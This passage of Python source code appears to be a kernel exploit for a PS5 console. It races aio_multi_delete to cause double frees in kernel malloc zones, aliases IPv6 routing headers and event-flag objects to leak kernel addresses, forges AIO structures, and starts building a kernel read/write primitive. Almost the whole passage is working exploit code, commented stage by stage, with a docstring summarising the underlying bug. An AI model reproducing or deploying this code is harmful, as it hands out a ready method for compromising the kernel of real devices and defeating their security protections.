    ret = u64_to_i64(sc.syscalls.aio_multi_wait(ids, num_ids, states, mode, timeout))
    if ret == -1:
        raise Exception(
            "aio_multi_wait error: %d\n%s"
            % (
                sc.syscalls.aio_multi_wait.errno,
                sc.syscalls.aio_multi_wait.get_error_string(),
            )
        )
    return ret


def new_socket():
    sd = u64_to_i64(sc.syscalls.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP))
    if sd == -1:
        raise Exception(
            "new_socket error: %d\n%s"
            % (sc.syscalls.socket.errno, sc.syscalls.socket.get_error_string())
        )
    return sd


def new_tcp_socket():
    sd = u64_to_i64(sc.syscalls.socket(AF_INET, SOCK_STREAM, 0))
    if sd == -1:
        raise Exception(
            "new_tcp_socket error: %d\n%s"
            % (sc.syscalls.socket.errno, sc.syscalls.socket.get_error_string())
        )
    return sd


def ssockopt(sd, level, optname, optval, optlen):
    if u64_to_i64(sc.syscalls.setsockopt(sd, level, optname, optval, optlen)) == -1:
        raise Exception(
            "ssockopt error: %d\n%s"
            % (sc.syscalls.setsockopt.errno, sc.syscalls.setsockopt.get_error_string())
        )


def gsockopt(sd, level, optname, optval, optlen):
    size = alloc(8)
    size[0:4] = struct.pack("<I", optlen)
    if u64_to_i64(sc.syscalls.getsockopt(sd, level, optname, optval, size)) == -1:
        raise Exception(
            "gsockopt error: %d\n%s"
            % (sc.syscalls.getsockopt.errno, sc.syscalls.getsockopt.get_error_string())
        )
    return struct.unpack("<I", size[0:4])[0]


def make_reqs1(num_reqs):
    reqs1 = alloc(0x28 * num_reqs)
    for i in range(num_reqs):
        reqs1[i * 0x28 + 0x20 : i * 0x28 + 0x24] = struct.pack("<I", 0xFFFFFFFF)
    return reqs1


def spray_aio(loops, reqs1, num_reqs, ids, multi=True, cmd=AIO_CMD_READ):
    loops = loops or 1

    step = 4 * (num_reqs if multi else 1)
    cmd = cmd | (AIO_CMD_FLAG_MULTI if multi else 0)

    for i in range(loops):
        aio_submit_cmd(cmd, reqs1, num_reqs, ids + (i * step))


def cancel_aios(ids, num_ids):
    len = MAX_AIO_IDS
    rem = num_ids % len
    num_batches = (num_ids - rem) // len

    for i in range(num_batches):
        aio_multi_cancel(ids + (i * len * 4), len)

    if rem > 0:
        aio_multi_cancel(ids + (num_batches * len * 4), rem)


def free_aios(ids, num_ids, do_cancel=True):
    len = MAX_AIO_IDS
    rem = num_ids % len
    num_batches = (num_ids - rem) // len

    for i in range(num_batches):
        addr = ids + (i * len * 4)
        if do_cancel:
            aio_multi_cancel(addr, len)
        aio_multi_poll(addr, len)
        aio_multi_delete(addr, len)

    if rem > 0:
        addr = ids + (num_batches * len * 4)
        if do_cancel:
            aio_multi_cancel(addr, rem)
        aio_multi_poll(addr, rem)
        aio_multi_delete(addr, rem)


def free_aios2(ids, num_ids):
    free_aios(ids, num_ids, do_cancel=False)


def setup(block_fd):

    # 1. block AIO

    # this part will block the worker threads from processing entries so that we may cancel them instead.
    # this is to work around the fact that aio_worker_entry2() will fdrop() the file associated with the aio_entry on ps5.
    # we want aio_multi_delete() to call fdrop()

    reqs1 = alloc(0x28 * NUM_WORKERS)
    block_id = alloc(4)

    for i in range(NUM_WORKERS):
        reqs1[i * 0x28 + 8 : i * 0x28 + 12] = struct.pack("<I", 1)  # nbyte
        reqs1[i * 0x28 + 0x20 : i * 0x28 + 0x24] = struct.pack("<I", block_fd)  # fd

    aio_submit_cmd(AIO_CMD_READ, reqs1, NUM_WORKERS, block_id)

    # 2. heap grooming

    # chosen to maximize the number of 0x80 malloc allocs per submission
    num_reqs = 3
    groom_ids = alloc(4 * NUM_GROOMS)
    greqs = make_reqs1(num_reqs)

    # allocate enough so that we start allocating from a newly created slab
    spray_aio(
        NUM_GROOMS, get_ref_addr(greqs), num_reqs, get_ref_addr(groom_ids), multi=False
    )
    cancel_aios(get_ref_addr(groom_ids), NUM_GROOMS)

    return block_id, groom_ids


pipe_buf = alloc(8)
ready_signal = alloc(8)
deletion_signal = alloc(8)


def reset_race_state():
    # clean up race states
    ready_signal[0:8] = struct.pack("<Q", 0)
    deletion_signal[0:8] = struct.pack("<Q", 0)


def prepare_aio_multi_delete_rop(request_addr, sce_errs, pipe_read_fd):
    chain = ROPChain(sc)

    # set worker thread core to be the same as main thread core so they
    # will use similar per-cpu freelist bucket
    rop_pin_to_core(chain, MAIN_CORE)
    rop_set_rtprio(chain, MAIN_RTPRIO)

    # mark thread as ready
    chain.push_write_into_memory(get_ref_addr(ready_signal), 1)

    # this will block the thread until it is signalled to run
    chain.push_syscall(SYSCALL["read"], pipe_read_fd, pipe_buf, 1)

    # do the deletion op
    chain.push_syscall(
        SYSCALL["aio_multi_delete"],
        request_addr,
        1,
        sce_errs + 4,
    )

    # mark deletion as finished
    chain.push_write_into_memory(get_ref_addr(deletion_signal), 1)

    return chain


"""
summary of the bug at aio_multi_delete():

void free_queue_entry(struct aio_entry *reqs2)
{
    if (reqs2->ar2_spinfo != NULL) {
        printf("[0]%s() line=%d Warning !! split info is here\n", __func__, __LINE__);
    }
    if (reqs2->ar2_file != NULL) {
        // we can potentially delay .fo_close()
        fdrop(reqs2->ar2_file, curthread);
        reqs2->ar2_file = NULL;
    }
    // can double free on reqs2
    // allocated size is 0x58 which falls onto malloc 0x80 zone
    free(reqs2, M_AIO_REQS2);
}

int _aio_multi_delete(struct thread *td, SceKernelAioSubmitId ids[], u_int num_ids, int sce_errors[])
{
    // ...
    struct aio_object *obj = id_rlock(id_tbl, id, 0x160, id_entry);
    // ...
    u_int rem_ids = obj->ao_rem_ids;
    if (rem_ids != 1) {
        // BUG: wlock not acquired on this path
        obj->ao_rem_ids = rem_ids;
        // ...
        free_queue_entry(obj->ao_entries[req_idx]);
        // the race can crash because of a NULL dereference since this path
        // doesn't check if the array slot is NULL so we delay
        // free_queue_entry()
        obj->ao_entries[req_idx] = NULL;
    } else {
        // ...
    }
    // ...
}
"""


def create_pipe():
    fildes = alloc(0x10)
    if (
        u64_to_i64(
            sc.syscalls.pipe(
                fildes,
            )
        )
        == -1
    ):
        raise Exception(
            "create_pipe error: %d\n%s"
            % (sc.syscalls.pipe.errno, sc.syscalls.pipe.get_error_string())
        )
    pipe_read_fd = struct.unpack("<I", fildes[0:4])[0]
    pipe_write_fd = struct.unpack("<I", fildes[4:8])[0]
    return pipe_read_fd, pipe_write_fd


def wait_for(addr, val):
    while True:
        curr = struct.unpack("<Q", addr[0:8])[0]
        if curr == val:
            break


def build_rthdr(buf, size):
    len = ((size >> 3) - 1) & 0xFFFFFFFE
    size = (len + 1) << 3

    buf[0:1] = struct.pack("<B", 0)  # ip6r_nxt
    buf[1:2] = struct.pack("<B", len)  # ip6r_len
    buf[2:3] = struct.pack("<B", 0)  # ip6r_type
    buf[3:4] = struct.pack("<B", len >> 1)  # ip6r_segleft

    return size


def get_rthdr(sd, buf, len):
    return gsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, get_ref_addr(buf), len)


def set_rthdr(sd, buf, len):
    ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, get_ref_addr(buf), len)


def free_rthers(sds):
    for sd in sds:
        ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0)


def make_aliased_rthdrs(sds):
    marker_offset = 4
    size = 0x80
    buf = alloc(size)
    rsize = build_rthdr(buf, size)

    for loop in range(1, NUM_ALIAS + 1):
        for i in range(NUM_SDS):
            buf[marker_offset : marker_offset + 4] = struct.pack("<I", i)
            set_rthdr(sds[i], buf, rsize)

        for i in range(NUM_SDS):
            get_rthdr(sds[i], buf, rsize)
            marker = struct.unpack("<I", buf[marker_offset : marker_offset + 4])[0]
            if marker != i:
                sd_pair = (sds[i], sds[marker])
                print(
                    "aliased rthdrs at attempt: %d (found pair: %d %d)"
                    % (loop, sd_pair[0], sd_pair[1])
                )
                sds.remove(sd_pair[0])
                sds.remove(sd_pair[1])
                free_rthers(sds)
                for _ in range(2):
                    sds.append(new_socket())

                return sd_pair

    raise Exception("failed to make aliased rthdrs: size %s" % hex(size))


def race_one(request_addr, tcp_sd, sds):
    reset_race_state()

    sce_errs = alloc(8)
    sce_errs[0:4] = struct.pack("<I", 0xFFFFFFFF)
    sce_errs[4:8] = struct.pack("<I", 0xFFFFFFFF)

    pipe_read_fd, pipe_write_fd = create_pipe()

    # prepare ropchain to race for aio_multi_delete
    delete_chain = prepare_aio_multi_delete_rop(
        request_addr, get_ref_addr(sce_errs), pipe_read_fd
    )

    # spawn worker thread
    thr = PrimThread(sc, delete_chain)
    thr_tid = thr.run()

    # wait for the worker thread to ready
    wait_for(get_ref_addr(ready_signal), 1)

    # notify worker thread to resume
    sc.syscalls.write(pipe_write_fd, pipe_buf, 1)

    # yield and hope the scheduler runs the worker next.
    # the worker will then sleep at soclose() and hopefully we run next
    sc.syscalls.sched_yield()

    # if we get here and the worker hasn't been reran then we can delay the
    # worker's execution of soclose() indefinitely
    suspend_res = sc.syscalls.thr_suspend_ucontext(thr_tid)

    print("suspend %s: %d" % (hex(thr_tid), suspend_res))

    poll_err = alloc(4)
    aio_multi_poll(request_addr, 1, poll_err)
    poll_res = struct.unpack("<I", poll_err[0:4])[0]
    print("poll: %s" % hex(poll_res))

    info_buf = alloc(0x100)
    info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, get_ref_addr(info_buf), 0x100)

    if info_size != size_tcp_info:
        print("info size isn't %d: %d" % (size_tcp_info, info_size))

    tcp_state = struct.unpack("<B", info_buf[0:1])[0]
    print("tcp state: %d" % tcp_state)

    won_race = False

    # to win, must make sure that poll_res == 0x10003/0x10004 and tcp_state == 5
    if poll_res != SCE_KERNEL_ERROR_ESRCH and tcp_state != TCPS_ESTABLISHED:
        # PANIC: double free on the 0x80 malloc zone.
        # important kernel data may alias
        aio_multi_delete(request_addr, 1, sce_errs)
        won_race = True

    # resume the worker thread
    result = sc.syscalls.thr_resume_ucontext(thr_tid)
    print("resume %s: %d" % (hex(thr_tid), result))

    wait_for(get_ref_addr(deletion_signal), 1)

    if won_race:
        err_main_thr = struct.unpack("<I", sce_errs[0:4])[0]
        err_worker_thr = struct.unpack("<I", sce_errs[4:8])[0]
        print("sce_errs: %s %s" % (hex(err_main_thr), hex(err_worker_thr)))

        # if the code has no bugs then this isn't possible but we keep the check for easier debugging
        # NOTE: both must be equal 0 for the double free to work
        if err_main_thr != err_worker_thr:
            raise Exception(
                "sce_errs mismatch: %s %s" % (hex(err_main_thr), hex(err_worker_thr))
            )

        # RESTORE: double freed memory has been reclaimed with harmless data
        # PANIC: 0x80 malloc zone pointers aliased
        return make_aliased_rthdrs(sds)

    return None


def double_free_reqs2(sds):
    # 1. setup socket to wait for soclose
    def htons(port):
        return (((port & 0xFF) << 8) | ((port >> 8) & 0xFF)) % 0x10000

    def aton(ip):
        parts = ip.split(".")
        return (
            (int(parts[3]) << 24)
            | (int(parts[2]) << 16)
            | (int(parts[1]) << 8)
            | int(parts[0])
        )

    server_addr = alloc(16)

    server_addr[1:2] = struct.pack("<B", AF_INET)
    server_addr[2:4] = struct.pack("<H", htons(5050))
    server_addr[4:8] = struct.pack("<I", aton("127.0.0.1"))

    sd_listen = new_tcp_socket()
    print("sd_listen: %d" % sd_listen)

    enable = struct.pack("<I", 1)
    nogc.append(enable)

    ssockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, get_ref_addr(enable), 4)

    if u64_to_i64(sc.syscalls.bind(sd_listen, server_addr, 16)) == -1:
        raise Exception(
            "bind error: %d\n%s"
            % (sc.syscalls.bind.errno, sc.syscalls.bind.get_error_string())
        )
    if u64_to_i64(sc.syscalls.listen(sd_listen, 1)) == -1:
        raise Exception(
            "listen error: %d\n%s"
            % (sc.syscalls.listen.errno, sc.syscalls.listen.get_error_string())
        )

    # 2. start the race
    num_reqs = 3
    which_req = num_reqs - 1
    reqs1 = make_reqs1(num_reqs)
    aio_ids = alloc(4 * num_reqs)
    req_addr = get_ref_addr(aio_ids) + (which_req * 4)
    cmd = AIO_CMD_MULTI_READ

    for i in range(NUM_RACES):
        sd_client = new_tcp_socket()
        print("sd_client: %d" % sd_client)

        ret = sc.syscalls.connect(sd_client, server_addr, 16)
        if u64_to_i64(ret) == -1:
            raise Exception(
                "connect error: %d\n%s"
                % (sc.syscalls.connect.errno, sc.syscalls.connect.get_error_string())
            )

        print("connected, ret: %d" % ret)

        sd_conn = sc.syscalls.accept(sd_listen, 0, 0)
        if u64_to_i64(sd_conn) == -1:
            raise Exception(
                "accept error: %d\n%s"
                % (sc.syscalls.accept.errno, sc.syscalls.accept.get_error_string())
            )
        print("sd_conn: %d" % sd_conn)

        linger_buf = alloc(8)
        linger_buf[0:4] = struct.pack("<I", 1)  # l_onoff - linger active
        linger_buf[4:8] = struct.pack(
            "<I", 1
        )  # l_linger - how many seconds to linger for

        # force soclose to sleep
        ssockopt(sd_client, SOL_SOCKET, SO_LINGER, get_ref_addr(linger_buf), 8)

        reqs1[which_req * 0x28 + 0x20 : which_req * 0x28 + 0x24] = struct.pack(
            "<I", sd_client
        )

        aio_submit_cmd(cmd, get_ref_addr(reqs1), num_reqs, get_ref_addr(aio_ids))
        aio_multi_cancel(get_ref_addr(aio_ids), num_reqs)
        aio_multi_poll(get_ref_addr(aio_ids), num_reqs)

        # drop the reference so that aio_multi_delete() will trigger _fdrop()
        sc.syscalls.close(sd_client)

        res = race_one(req_addr, sd_conn, sds)

        # MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
        # twice. this will leave one request undeleted
        aio_multi_delete(get_ref_addr(aio_ids), num_reqs)
        sc.syscalls.close(sd_conn)

        if res is not None:
            print("won race at attempt: %d" % (i + 1))
            sc.syscalls.close(sd_listen)
            return res

    raise Exception("failed aio double free")


def new_evf(name, flags):
    ret = u64_to_i64(sc.syscalls.evf_create(name, 0, flags))
    if ret == -1:
        raise Exception(
            "evf_create error: %d\n%s"
            % (sc.syscalls.evf_create.errno, sc.syscalls.evf_create.get_error_string())
        )
    return ret


def set_evf_flags(id, flags):
    if u64_to_i64(sc.syscalls.evf_clear(id, 0)) == -1:
        raise Exception(
            "evf_clear error: %d\n%s"
            % (sc.syscalls.evf_clear.errno, sc.syscalls.evf_clear.get_error_string())
        )
    if u64_to_i64(sc.syscalls.evf_set(id, flags)) == -1:
        raise Exception(
            "evf_set error: %d\n%s"
            % (sc.syscalls.evf_set.errno, sc.syscalls.evf_set.get_error_string())
        )


def free_evf(id):
    if u64_to_i64(sc.syscalls.evf_delete(id)) == -1:
        raise Exception(
            "evf_delete error: %d\n%s"
            % (sc.syscalls.evf_delete.errno, sc.syscalls.evf_delete.get_error_string())
        )


def verity_reqs2(addr, cmd):
    # reqs2.ar2_cmd
    if readuint(addr, 4) != cmd:
        return False

    # heap_prefixes is a array of randomized prefix bits from a group of heap
    # address candidates. if the candidates truly are from the heap, they must
    # share a common prefix
    heap_prefixes = []

    # check if offsets 0x10 to 0x20 look like a kernel heap address
    for i in range(0x10, 0x20, 8):
        if readuint(addr + i + 6, 2) != 0xFFFF:
            return False
        prefix = readuint(addr + i + 4, 2)
        if prefix not in heap_prefixes:
            heap_prefixes.append(prefix)

    # check reqs2.ar2_result.state
    # state is actually a 32-bit value but the allocated memory was initialized with zeros.
    # all padding bytes must be 0 then
    state1 = readuint(addr + 0x38, 4)
    state2 = readuint(addr + 0x38 + 4, 4)
    if not (state1 > 0 and state1 <= 4) or state2 != 0:
        return False

    # reqs2.ar2_file must be NULL since we passed a bad file descriptor to aio_submit_cmd()
    if readuint(addr + 0x40, 8) != 0:
        return False

    # check if offsets 0x48 to 0x50 look like a kernel address
    for i in range(0x48, 0x50, 8):
        if readuint(addr + i + 6, 2) == 0xFFFF:
            # don't push kernel ELF addresses
            if readuint(addr + i + 4, 2) != 0xFFFF:
                heap_prefixes.append(readuint(addr + i + 4, 2))
            # offset 0x48 can be NULL
        elif i == 0x50 or readuint(addr + i, 8) != 0:
            return False

    if len(heap_prefixes) < 2:
        return False

    first_prefix = heap_prefixes[0]
    for idx in range(1, len(heap_prefixes)):
        if heap_prefixes[idx] != first_prefix:
            return False

    return True


def leak_kernel_addrs(sd_pair, sds):
    sd = sd_pair[0]
    buflen = 0x80 * LEAK_LEN
    buf = alloc(buflen)

    # type confuse a struct evf with a struct ip6_rthdr.
    # the flags of the evf must be set to >= 0xf00 in order to fully leak the contents of the rthdr
    print("confuse evf with rthdr")

    name = alloc(1)

    # free one of rthdr
    sc.syscalls.close(sd_pair[1])

    evf = None
    for i in range(NUM_ALIAS):
        evfs = []

        # reclaim freed rthdr with evf object
        for j in range(NUM_HANDLES):
            evf_flags = 0xF00 | (j << 16)
            evfs.append(new_evf(name, evf_flags))

        get_rthdr(sd, buf, 0x80)

        # for simplicty, we'll assume i < 2**16
        flag = struct.unpack("<I", buf[0:4])[0]

        if flag & 0xF00 == 0xF00:
            idx = flag >> 16
            expected_flag = flag | 1

            evf = evfs[idx]

            set_evf_flags(evf, expected_flag)
            get_rthdr(sd, buf, 0x80)

            val = struct.unpack("<I", buf[0:4])[0]
            if val == expected_flag:
                evfs.remove(evf)
            else:
                evf = None

        for each_evf in evfs:
            free_evf(each_evf)

        if evf is not None:
            print("confused rthdr and evf at attempt: %d" % (i + 1))
            break

    if evf is None:
        raise Exception("failed to confuse rthdr and evf")

    # ip6_rthdr and evf obj are overlapped by now
    # enlarge ip6_rthdr by writing to its len field by setting the evf's flag
    set_evf_flags(evf, 0xFF << 8)

    # fields we use from evf (number before the field is the offset in hex):
    # struct evf:
    #     0 u64 flags
    #     28 struct cv cv
    #     38 TAILQ_HEAD(struct evf_waiter) waiters

    # evf.cv.cv_description = "evf cv"
    # string is located at the kernel's mapped ELF file
    kernel_addr = struct.unpack("<Q", buf[0x28 : 0x28 + 8])[0]
    print('"evf cv" string addr: %s' % hex(kernel_addr))

    # because of TAILQ_INIT(), we have:
    #
    # evf.waiters.tqh_last == &evf.waiters.tqh_first
    #
    # we now know the address of the kernel buffer we are leaking
    kbuf_addr = struct.unpack("<Q", buf[0x40 : 0x40 + 8])[0] - 0x38
    print("kernel buffer addr: %s" % hex(kbuf_addr))

    #
    # prep to fake reqs3 (aio_batch)
    #

    wbufsz = 0x80
    wbuf = alloc(wbufsz)
    rsize = build_rthdr(wbuf, wbufsz)
    marker_val = 0xDEADBEEF
    reqs3_offset = 0x10

    wbuf[4:8] = struct.pack("<I", marker_val)
    wbuf[reqs3_offset : reqs3_offset + 4] = struct.pack("<I", 1)  # .ar3_num_reqs
    wbuf[reqs3_offset + 4 : reqs3_offset + 8] = struct.pack("<I", 0)  # .ar3_reqs_left
    wbuf[reqs3_offset + 8 : reqs3_offset + 12] = struct.pack(
        "<I", AIO_STATE_COMPLETE
    )  # .ar3_state
    wbuf[reqs3_offset + 0xC : reqs3_offset + 0xD] = struct.pack("<B", 0)  # .ar3_done
    wbuf[reqs3_offset + 0x28 : reqs3_offset + 0x28 + 4] = struct.pack(
        "<I", 0x67B0000
    )  # .ar3_lock.lock_object.lo_flags
    wbuf[reqs3_offset + 0x38 : reqs3_offset + 0x40] = struct.pack(
        "<Q", 1
    )  # .ar3_lock.lk_lock = LK_UNLOCKED

    #
    # prep to leak reqs2 (aio_entry)
    #

    # 0x80 < num_elems * sizeof(SceKernelAioRWRequest) <= 0x100
    # allocate reqs1 arrays at 0x100 malloc zone
    num_elems = 6

    # use reqs1 to fake a aio_info.
    # set .ai_cred (offset 0x10) to offset 4 of the reqs2 so crfree(ai_cred) will harmlessly decrement the .ar2_ticket field
    ucred = kbuf_addr + 4
    leak_reqs = make_reqs1(num_elems)
    leak_reqs[0x10:0x18] = struct.pack("<Q", ucred)

    num_loop = NUM_SDS
    leak_ids_len = num_loop * num_elems
    leak_ids = alloc(4 * leak_ids_len)
    step = 4 * num_elems
    cmd = AIO_CMD_WRITE | AIO_CMD_FLAG_MULTI

    reqs2_off = None
    fake_reqs3_off = None
    fake_reqs3_sd = None

    for i in range(NUM_LEAKS):
        # spray reqs2 and rthdr with fake reqs3
        for j in range(num_loop):
            wbuf[8:12] = struct.pack("<I", j)
            aio_submit_cmd(
                cmd,
                get_ref_addr(leak_reqs),
                num_elems,
                get_ref_addr(leak_ids) + (j * step),
            )
            set_rthdr(sds[j], wbuf, rsize)

        # out of bound read on adjacent malloc 0x80 memory
        get_rthdr(sd, buf, buflen)

        sd_idx = None
        reqs2_off, fake_reqs3_off = None, None

        for off in range(0, buflen - 1, 0x80):
            if not reqs2_off and verity_reqs2(get_ref_addr(buf) + off, AIO_CMD_WRITE):
                reqs2_off = off
            if not fake_reqs3_off:
                marker = struct.unpack("<I", buf[off + 4 : off + 8])[0]
                if marker == marker_val:
                    fake_reqs3_off = off
                    sd_idx = struct.unpack("<I", buf[off + 8 : off + 12])[0]

        if reqs2_off and fake_reqs3_off:
            print("found reqs2 and fake reqs3 at attempt: %d" % (i + 1))
            fake_reqs3_sd = sds[sd_idx]
            sds.remove(fake_reqs3_sd)
            free_rthers(sds)
            sds.append(new_socket())
            break

        free_aios(get_ref_addr(leak_ids), leak_ids_len)

    if reqs2_off is None or fake_reqs3_off is None:
        raise Exception("could not leak reqs2 and fake reqs3")

    print("reqs2 offset: %s" % hex(reqs2_off))
    print("fake reqs3 offset: %s" % hex(fake_reqs3_off))

    get_rthdr(sd, buf, buflen)

    # TODO: write hex dump function for easier debugging
    # print('leaked aio_entry:')

    # store for curproc leak later
    aio_info_addr = struct.unpack("<Q", buf[reqs2_off + 0x18 : reqs2_off + 0x20])[0]

    # reqs1 is allocated from malloc 0x100 zone, so it must be aligned at 0xff..xx00
    reqs1_addr = struct.unpack("<Q", buf[reqs2_off + 0x10 : reqs2_off + 0x18])[0]
    reqs1_addr = reqs1_addr & 0xFFFFFFFFFFFFFF00

    fake_reqs3_addr = kbuf_addr + fake_reqs3_off + reqs3_offset

    print("reqs1_addr = %s" % hex(reqs1_addr))
    print("fake_reqs3_addr = %s" % hex(fake_reqs3_addr))

    print("searching target_id")

    target_id = None
    to_cancel = None
    to_cancel_len = None

    for i in range(0, leak_ids_len, num_elems):
        aio_multi_cancel(get_ref_addr(leak_ids) + i * 4, num_elems)
        get_rthdr(sd, buf, buflen)

        state = struct.unpack("<I", buf[reqs2_off + 0x38 : reqs2_off + 0x3C])[0]
        if state == AIO_STATE_ABORTED:
            target_id = struct.unpack("<I", leak_ids[i * 4 : i * 4 + 4])[0]
            leak_ids[i * 4 : i * 4 + 4] = struct.pack("<I", 0)

            print(
                "found target_id=%s, i=%d, batch=%d"
                % (hex(target_id), i, i // num_elems)
            )

            start = i + num_elems
            to_cancel = get_ref_addr(leak_ids) + (start * 4)
            to_cancel_len = leak_ids_len - start
            break

    if target_id is None:
        raise Exception("target id not found")

    cancel_aios(to_cancel, to_cancel_len)
    free_aios2(get_ref_addr(leak_ids), leak_ids_len)

    return (
        reqs1_addr,
        kbuf_addr,
        kernel_addr,
        target_id,
        evf,
        fake_reqs3_addr,
        fake_reqs3_sd,
        aio_info_addr,
    )


def make_aliased_pktopts(sds):
    tclass = alloc(4)

    for loop in range(NUM_ALIAS):
        for i in range(len(sds)):
            tclass[0:4] = struct.pack("<I", i)
            ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, get_ref_addr(tclass), 4)

        for i in range(len(sds)):
            gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, get_ref_addr(tclass), 4)
            marker = struct.unpack("<I", tclass[0:4])[0]
            if marker != i:
                sd_pair = (sds[i], sds[marker])
                print(
                    "aliased pktopts at attempt: %d (found pair: %d %d)"
                    % (loop, sd_pair[0], sd_pair[1])
                )
                sds.remove(marker)
                sds.remove(i)
                free_rthers(sds)
                for _ in range(2):
                    sock_fd = new_socket()
                    ssockopt(sock_fd, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
                    sds.append(sock_fd)

                return sd_pair

        for sd in sds:
            ssockopt(sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0)

    return None


def double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_reqs3_addr):
    max_leak_len = (0xFF + 1) << 3
    buf = alloc(max_leak_len)

    num_elems = MAX_AIO_IDS
    aio_reqs = make_reqs1(num_elems)

    num_batches = 2
    aio_ids_len = num_batches * num_elems
    aio_ids = alloc(4 * aio_ids_len)

    print("start overwrite rthdr with AIO queue entry loop")
    aio_not_found = True
    free_evf(evf)

    for i in range(NUM_CLOBBERS):
        spray_aio(num_batches, get_ref_addr(aio_reqs), num_elems, get_ref_addr(aio_ids))

        size_ret = get_rthdr(sd, buf, max_leak_len)
        cmd = struct.unpack("<I", buf[0:4])[0]

        if size_ret == 8 and cmd == AIO_CMD_READ:
            print("aliased at attempt: %d" % (i + 1))
            aio_not_found = False
            cancel_aios(get_ref_addr(aio_ids), aio_ids_len)
            break

        free_aios(get_ref_addr(aio_ids), aio_ids_len)

    if aio_not_found:
        raise Exception("failed to overwrite rthdr")

    reqs2_size = 0x80
    reqs2 = alloc(reqs2_size)
    rsize = build_rthdr(reqs2, reqs2_size)

    reqs2[4:8] = struct.pack("<I", 5)  # .ar2_ticket
    reqs2[0x18:0x20] = struct.pack("<Q", reqs1_addr)  # .ar2_info
    reqs2[0x20:0x28] = struct.pack("<Q", fake_reqs3_addr)  # .ar2_batch

    states = alloc(4 * num_elems)
    addr_cache = []
    for i in range(num_batches):
        addr_cache.append(get_ref_addr(aio_ids) + (i * num_elems) << 2)

    print("start overwrite AIO queue entry with rthdr loop")

    sc.syscalls.close(sd)
    sd = None

    def overwrite_aio_entry_with_rthdr():
        for i in range(NUM_ALIAS):
            for j in range(NUM_SDS):
                set_rthdr(sds[j], reqs2, rsize)

            for batch in range(len(addr_cache)):
                for j in range(num_elems):
                    states[j * 4 : j * 4 + 4] = struct.pack("<I", 0xFFFFFFFF)

                aio_multi_cancel(addr_cache[batch], num_elems, states)

                req_idx = -1
                for j in range(num_elems):
                    val = struct.unpack("<I", states[j * 4 : j * 4 + 4])[0]
                    if val == AIO_STATE_COMPLETE:
                        req_idx = j
                        break

                if req_idx != -1:
                    print(
                        "states[%d] = %s",
                        req_idx,
                        hex(
                            struct.unpack("<I", states[req_idx * 4 : req_idx * 4 + 4])[
                                0
                            ]
                        ),
                    )
                    print("found req_id at batch: %d", batch)
                    print("aliased at attempt: %d" % (i + 1))

                    aio_idx = batch * num_elems + req_idx
                    req_id_p = get_ref_addr(aio_ids) + (aio_idx * 4)
                    req_id = readuint(req_id_p, 4)

                    print("req_id = %s" % hex(req_id))

                    aio_multi_poll(req_id_p, 1, states)
                    print(
                        "states[%d] = %s"
                        % (req_idx, hex(struct.unpack("<I", states[0:4])[0]))
                    )
                    sc.mem[req_id_p - 0x1000 : req_id_p - 0x1000 + 4] = struct.pack(
                        "<I", 0
                    )

                    return req_id

        return None

    req_id = overwrite_aio_entry_with_rthdr()
    if req_id is None:
        raise Exception("failed to overwrite AIO queue entry")

    free_aios2(get_ref_addr(aio_ids), aio_ids_len)

    target_id_p = alloc(4)
    target_id_p[0:4] = struct.pack("<I", target_id)

    # enable deletion of target_id
    aio_multi_poll(get_ref_addr(target_id_p), 1, states)
    print("target's state: %s", hex(struct.unpack("<I", states[0:4])[0]))

    sce_errs = alloc(8)
    sce_errs[0:4] = struct.pack("<I", 0xFFFFFFFF)
    sce_errs[4:8] = struct.pack("<I", 0xFFFFFFFF)

    target_ids = alloc(8)
    target_ids[0:4] = struct.pack("<I", req_id)
    target_ids[4:8] = struct.pack("<I", target_id)

    # double free on malloc 0x100 by:
    #   - freeing target_id's aio_object->reqs1
    #   - freeing req_id's aio_object->aio_entries[x]->ar2_info
    #      - ar2_info points to same addr as target_id's aio_object->reqs1

    # PANIC: double free on the 0x100 malloc zone. important kernel data may alias
    aio_multi_delete(get_ref_addr(target_ids), 2, sce_errs)

    # we reclaim first since the sanity checking here is longer which makes it
    # more likely that we have another process claim the memory

    # RESTORE: double freed memory has been reclaimed with harmless data
    # PANIC: 0x100 malloc zone pointers aliased
    sd_pair = make_aliased_pktopts(sds_alt)

    err1 = struct.unpack("<I", sce_errs[0:4])[0]
    err2 = struct.unpack("<I", sce_errs[4:8])[0]
    print("delete errors: %s %s" % (hex(err1), hex(err2)))

    states[0:4] = struct.pack("<I", 0xFFFFFFFF)
    states[4:8] = struct.pack("<I", 0xFFFFFFFF)

    aio_multi_poll(get_ref_addr(target_id_p), 2, states)
    print(
        "target states: %s %s"
        % (
            hex(struct.unpack("<I", states[0:4])[0]),
            hex(struct.unpack("<I", states[4:8])[0]),
        )
    )

    success = True
    if struct.unpack("<I", states[0:4])[0] != SCE_KERNEL_ERROR_ESRCH:
        print("ERROR: bad delete of corrupt AIO request")
        success = False

    if err1 != 0 or err1 != err2:
        print("ERROR: bad delete of ID pair")
        success = False

    if not success:
        raise Exception("ERROR: double free on a 0x100 malloc zone failed")

    if sd_pair is None:
        raise Exception("failed to make aliased pktopts")

    return sd_pair


class IPv6KernelRW(object):
    def __init__(self, ofiles, kread8, kwrite8):
        self.ofiles = ofiles
        self.kread8 = kread8
        self.kwrite8 = kwrite8

        self.pipe_read_fd = 0
        self.pipe_write_fd = 0
        self.pipe_addr = 0
        self.pipemap_buffer = bytearray()
        self.read_mem = bytearray()

        self.master_target_buf = bytearray()
        self.slave_buf = bytearray()
        self.pktinfo_size_store = bytearray()
        self.master_sock = 0
        self.victim_sock = 0

        self.create_pipe_pair()
        self.create_overlapped_ipv6_sockets()

    def get_fd_data_addr(self, fd):
        filedescent_addr = self.ofiles + fd * SELECTED_KERNEL_OFFSETS["SIZEOF_OFILES"]
        file_addr = self.kread8(filedescent_addr)  # fde_file
        return self.kread8(file_addr)  # f_data

    def create_pipe_pair(self):
        pipe_fds = alloc(8)
